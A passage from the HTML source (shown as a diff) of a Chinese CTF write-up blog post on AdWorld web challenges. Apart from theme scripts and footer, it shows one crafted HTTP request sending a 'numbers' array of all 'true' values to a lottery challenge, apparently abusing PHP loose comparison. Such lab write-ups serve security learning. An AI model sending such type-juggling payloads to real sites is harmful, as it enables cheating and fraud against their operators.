</span>http://111.200.241.244:65291<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://111.200.241.244:65291/buy.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=033ccd6090ed9e7b2533a4803695805f<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;buy&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;numbers&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span> <span class="hljs-punctuation">,</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span> <span class="hljs-punctuation">,</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615151152237.png" srcset="/img/loading.gif" lazyload alt="" /></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>攻防世界Web高手进阶区(二)</div>
+      <div>https://blue-arc.github.io/2022/06/15/AdWorld-2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>冰蓝弧影</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月15日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/10/AdWorld-1/" title="攻防世界Web高手进阶区(一)">
+                        <span class="hidden-mobile">攻防世界Web高手进阶区(一)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.16/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TyS3NfQ1bcjfGf0GjH0Lye57-gzGzoHsz","appKey":"86iDdi7JfrLheVtpOpRWlhMk","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
